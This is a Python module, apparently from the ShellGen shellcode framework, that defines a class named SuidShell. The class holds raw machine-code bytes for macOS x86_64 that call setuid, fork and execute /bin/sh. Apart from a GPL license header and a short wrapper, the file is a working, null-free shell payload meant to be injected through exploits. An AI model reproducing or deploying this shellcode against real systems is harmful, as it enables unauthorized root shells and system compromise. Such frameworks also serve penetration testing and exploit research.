#!/usr/bin/env python

###############################################################################
## Setuid, Fork and execute /bin/sh in MacOSX/x86_64                         ##
## Shellcode for ShellGen                                                    ##
## Based on original code by capi_x from 48bits                              ##
## http://radare.org/y/                                                      ##
###############################################################################

# Copyright (c) 2012-2013 Mario Vilas, capi_x
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.

"Setuid, Fork and execute /bin/sh."

__all__ = ["SuidShell"]

from shellgen import Static

class SuidShell (Static):
    """
    Setuid, Fork and execute /bin/sh in MacOSX/x86_64.

    Based on original code by capi_x from 48bits:
    U{http://radare.org/y/}
    """

    qualities = "payload"
    encoding  = "nullfree"

    # According to the original source, this shellcode was tested on Lion.
    bytes = (
        "\xb8\xa0\x88\x88\xfa\x05\x77\x77\x77\x07\x48\x31\xff\x0f\x05\xb8\x8b\x88\x88\xfa"
        "\x05\x77\x77\x77\x07\x0f\x05\xb8\x19\x8a\x88\xfa\x05\x77\x77\x77\x07\x48\x31\xd2"
        "\x48\x31\xf6\x0f\x05\xb8\xc4\x88\x88\xfa\x05\x77\x77\x77\x07\x48\xbf\x2f\x62\x69"
        "\x6e\x2f\x2f\x73\x68\x56\x57\x48\x89\xe7\x0f\x05"
    )
